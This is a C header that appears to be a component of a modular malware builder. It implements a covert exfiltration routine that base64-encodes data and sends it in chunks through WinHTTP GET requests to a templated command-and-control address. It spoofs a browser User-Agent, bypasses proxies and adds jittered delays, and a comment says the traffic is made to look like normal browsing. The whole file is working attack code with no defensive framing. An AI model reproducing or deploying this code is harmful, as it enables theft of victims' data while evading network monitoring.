// chunk: exfil/winhttp_get
// depends: core/emit_buffer
// provides: exfiltrate
// headers: winsock2.h, ws2tcpip.h, winhttp.h
// libs: ws2_32, winhttp
// note: HTTP GET with data in URL path segments — looks like normal browsing

#ifndef CHUNK_WINHTTP_GET
#define CHUNK_WINHTTP_GET

#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static const char _b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static int _url_b64_encode(const char *in, int inlen, char *out, int outmax) {
    int o = 0;
    for (int i = 0; i < inlen && o + 4 < outmax; i += 3) {
        int n = (unsigned char)in[i] << 16;
        if (i + 1 < inlen) n |= (unsigned char)in[i + 1] << 8;
        if (i + 2 < inlen) n |= (unsigned char)in[i + 2];
        out[o++] = _b64[(n >> 18) & 63];
        out[o++] = _b64[(n >> 12) & 63];
        out[o++] = (i + 1 < inlen) ? _b64[(n >> 6) & 63] : '=';
        out[o++] = (i + 2 < inlen) ? _b64[n & 63] : '=';
    }
    out[o] = 0;
    return o;
}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    wchar_t wip[64];
    MultiByteToWideChar(CP_ACP, 0, ip, -1, wip, 64);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                     WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;

    HINTERNET hConn = WinHttpConnect(hSession, wip, port, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return FALSE; }

    DWORD chunk_sz = 1024;
    DWORD offset = 0;
    BOOL ok = TRUE;

    while (offset < len && ok) {
        DWORD this_chunk = (len - offset > chunk_sz) ? chunk_sz : (len - offset);
        char encoded[2048];
        _url_b64_encode(data + offset, this_chunk, encoded, sizeof(encoded));

        char path[2200];
        snprintf(path, sizeof(path), "/d/%08x/%s", offset, encoded);

        wchar_t wpath[2200];
        MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, 2200);

        HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", wpath, NULL,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (hReq) {
            ok = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            if (ok) WinHttpReceiveResponse(hReq, NULL);
            WinHttpCloseHandle(hReq);
        }
        offset += this_chunk;
        Sleep(50 + (offset % 200));
    }

    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSession);
    return ok;
}

#endif
